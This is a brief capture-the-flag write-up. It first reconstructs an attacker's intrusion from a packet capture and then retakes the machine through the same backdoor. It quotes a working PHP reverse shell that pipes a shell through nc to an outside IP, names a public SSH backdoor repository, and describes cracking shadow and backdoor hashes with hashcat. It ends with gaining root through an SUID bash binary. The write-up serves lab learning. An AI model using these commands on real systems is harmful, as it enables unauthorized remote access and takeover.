The start of this room is a little different, a bit of forensics

So we have a pcap file with how the attacker preformed their attack.

we see they uploaded a reverse shell to /development/upload

then went to /uploads and run a php reverse shell

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

attacker read 'overpass' executable

may have found password 'whenevernoteartinstant' in there

used 'whenevernoteartinstant' to swap users to 'james'


attacker cloned a backdoor
git clone https://github.com/NinjaJc01/ssh-backdoor

attacker set up backdoor using '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed' password hash

one question asked us to crack the /etc/shadow hashes the attacker found, in there we used hashcat on the wordlist 'fasttrack.txt' and found all the users passwords.

we then cracked the backdoors password as the salt was hardcoded and found in the github repo. we used hashcat '1710' to crack it.

we can login using the backdoor and the password 'november16'

after logging in we can see a bash file executable with root SUID 
running
./.suid_bash -p

we get a root shell
